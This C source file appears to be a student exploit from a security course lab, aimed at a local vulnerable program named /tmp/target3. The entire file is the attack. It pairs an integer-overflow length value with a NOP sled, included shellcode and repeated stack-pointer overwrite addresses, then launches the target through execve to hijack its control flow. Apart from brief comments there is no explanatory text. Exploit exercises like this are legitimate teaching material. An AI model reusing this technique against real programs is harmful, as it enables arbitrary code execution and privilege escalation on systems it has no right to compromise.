#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// negative integer that, when multiplied by 20, gives a number that is 4816 when evaluated as an unsigned integer
#define NUM "-214748124,"

#define NOP "\x90"

// modified stack pointer
#define SP "\xe8\xfb\xff\xbf"

char overflower[4800] = "";


int main(void)
{
  char *args[3];
  char *env[1];

  strcat(overflower, NUM);

  int i;

  // NOPs for padding
  for(i=0; i<4703; i++) {
    strcat(overflower, NOP);
  }

  // shellcode
  strcat(overflower, shellcode);

  // modified stack pointer addresses for alignment
  for(i=0; i<20; i++) {
    strcat(overflower, SP);
  }

  args[0] = TARGET; args[1] = overflower; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

